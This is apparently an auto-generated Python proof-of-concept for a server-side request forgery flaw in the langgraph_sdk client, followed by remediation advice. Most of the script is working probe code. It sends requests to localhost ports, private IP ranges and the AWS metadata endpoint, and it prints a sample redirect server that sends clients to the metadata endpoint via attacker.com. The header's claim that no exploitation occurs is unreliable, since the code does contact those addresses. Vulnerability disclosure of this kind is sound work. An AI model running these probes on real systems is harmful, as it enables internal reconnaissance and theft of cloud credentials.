#!/usr/bin/env python3
# PoC for langgraph_sdk (/home/xcy/.local/lib/python3.14/site-packages/langgraph_sdk)
# Path: ssrf-002
# Sink: get_sync_client
# Auto-generated — run with: python3 ssrf_url_httpx_get_sync_client.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via langgraph_sdk get_sync_client

Vulnerability: The get_sync_client() function accepts a user-controlled URL
and passes it directly to httpx.Client as base_url without validation.
httpx follows redirects by default, allowing SSRF to internal services.

This PoC demonstrates:
1. Connecting to an attacker-controlled server that redirects to internal IP
2. Attempting to access cloud metadata endpoints (169.254.169.254)
3. Attempting to access common internal services (localhost:8080, etc.)

SAFETY: Uses benign targets by default. No actual exploitation occurs.
"""

import sys
import time
import urllib.parse
from typing import Optional

# Try to import httpx (required by langgraph_sdk)
try:
    import httpx
except ImportError:
    print("[!] httpx not installed. Install with: pip install httpx")
    sys.exit(1)

# Try to import langgraph_sdk
try:
    from langgraph_sdk import get_sync_client
except ImportError:
    print("[!] langgraph_sdk not installed or not in path.")
    print("    Install with: pip install langgraph-sdk")
    print("    Or run from the correct environment.")
    sys.exit(1)


def test_ssrf_redirect(target_url: str, redirect_url: str) -> None:
    """
    Test SSRF via redirect: create a client that follows redirects.
    
    In a real attack, an attacker-controlled server would return a 302
    redirect to an internal IP. Here we simulate by directly connecting
    to the redirect target.
    """
    print(f"\n[*] Testing SSRF via redirect to: {redirect_url}")
    print(f"    (Using target URL: {target_url})")
    
    try:
        # Create client with the target URL (simulating attacker-controlled)
        client = get_sync_client(url=target_url, api_key=None)
        
        # Attempt to make a request - httpx will follow redirects
        # In a real attack, the attacker's server would redirect to internal IP
        print(f"    [*] Client created. Attempting request...")
        
        # Make a GET request to the base URL
        response = client.client.get("/")
        print(f"    [*] Response status: {response.status_code}")
        print(f"    [*] Response headers: {dict(response.headers)}")
        
        if response.status_code == 200:
            print(f"    [!] SUCCESS: Connected to {redirect_url}")
            print(f"    [!] This demonstrates SSRF capability")
            return True
        else:
            print(f"    [-] Got status {response.status_code}, not a success")
            return False
            
    except httpx.ConnectError as e:
        print(f"    [-] Connection error: {e}")
        return False
    except httpx.TimeoutException as e:
        print(f"    [-] Timeout: {e}")
        return False
    except Exception as e:
        print(f"    [-] Unexpected error: {type(e).__name__}: {e}")
        return False


def test_direct_internal_access(internal_url: str) -> None:
    """
    Test direct access to internal services by using the URL directly.
    
    This demonstrates that get_sync_client accepts ANY URL, including
    internal IPs and cloud metadata endpoints.
    """
    print(f"\n[*] Testing direct internal access to: {internal_url}")
    
    try:
        # Create client directly with internal URL
        client = get_sync_client(url=internal_url, api_key=None)
        
        print(f"    [*] Client created successfully with internal URL")
        print(f"    [*] Attempting request...")
        
        # Make a request
        response = client.client.get("/", timeout=httpx.Timeout(5.0))
        print(f"    [*] Response status: {response.status_code}")
        print(f"    [*] Response body (first 200 chars): {response.text[:200]}")
        
        if response.status_code < 400:
            print(f"    [!] SUCCESS: Connected to internal service at {internal_url}")
            return True
        else:
            print(f"    [-] Got error status {response.status_code}")
            return False
            
    except httpx.ConnectError as e:
        print(f"    [-] Connection error (expected if service not running): {e}")
        return False
    except httpx.TimeoutException as e:
        print(f"    [-] Timeout (expected if service not running): {e}")
        return False
    except Exception as e:
        print(f"    [-] Unexpected error: {type(e).__name__}: {e}")
        return False


def demonstrate_vulnerability() -> None:
    """
    Main demonstration of the SSRF vulnerability.
    
    Shows that get_sync_client accepts arbitrary URLs without validation
    and follows redirects by default.
    """
    print("=" * 70)
    print("SSRF Proof-of-Concept: langgraph_sdk get_sync_client")
    print("=" * 70)
    print()
    print("[*] Vulnerability: get_sync_client() accepts arbitrary URLs")
    print("    and passes them directly to httpx.Client without validation.")
    print("    httpx follows redirects by default, enabling SSRF.")
    print()
    
    # Test 1: Direct internal access (localhost)
    print("-" * 70)
    print("Test 1: Direct access to localhost")
    print("-" * 70)
    test_direct_internal_access("http://localhost:8123")
    
    # Test 2: Cloud metadata endpoint (AWS)
    print()
    print("-" * 70)
    print("Test 2: Cloud metadata endpoint (AWS)")
    print("-" * 70)
    print("[*] Attempting to access AWS metadata endpoint...")
    print("    (This will likely fail if not on AWS, but demonstrates the vector)")
    test_direct_internal_access("http://169.254.169.254/latest/meta-data/")
    
    # Test 3: Common internal services
    print()
    print("-" * 70)
    print("Test 3: Common internal services")
    print("-" * 70)
    internal_targets = [
        "http://127.0.0.1:8080",
        "http://127.0.0.1:3000",
        "http://10.0.0.1:80",
        "http://192.168.1.1:80",
    ]
    
    for target in internal_targets:
        test_direct_internal_access(target)
        time.sleep(0.5)  # Small delay between requests
    
    # Test 4: Demonstrate redirect following
    print()
    print("-" * 70)
    print("Test 4: Redirect following (simulated)")
    print("-" * 70)
    print("[*] In a real attack, an attacker-controlled server would")
    print("    return a 302 redirect to an internal IP.")
    print("    httpx follows redirects by default, so the client")
    print("    would follow the redirect to the internal service.")
    print()
    print("[*] To test this, you would need to set up a server that")
    print("    returns a redirect. Example using Python:")
    print()
    print("    from http.server import HTTPServer, BaseHTTPRequestHandler")
    print("    class RedirectHandler(BaseHTTPRequestHandler):")
    print("        def do_GET(self):")
    print("            self.send_response(302)")
    print("            self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')")
    print("            self.end_headers()")
    print("    HTTPServer(('0.0.0.0', 9999), RedirectHandler).serve_forever()")
    print()
    print("    Then call get_sync_client(url='http://attacker.com:9999')")
    print("    and the client would follow the redirect to the metadata endpoint.")
    
    print()
    print("=" * 70)
    print("Demonstration complete.")
    print("=" * 70)
    print()
    print("[!] REMEDIATION:")
    print("    1. Validate and sanitize the URL parameter")
    print("    2. Implement an allowlist of allowed hosts/IPs")
    print("    3. Disable redirect following: httpx.Client(follow_redirects=False)")
    print("    4. Block private IP ranges (RFC 1918) and cloud metadata IPs")
    print("    5. Use a proxy or DNS-based restrictions")


if __name__ == "__main__":
    demonstrate_vulnerability()
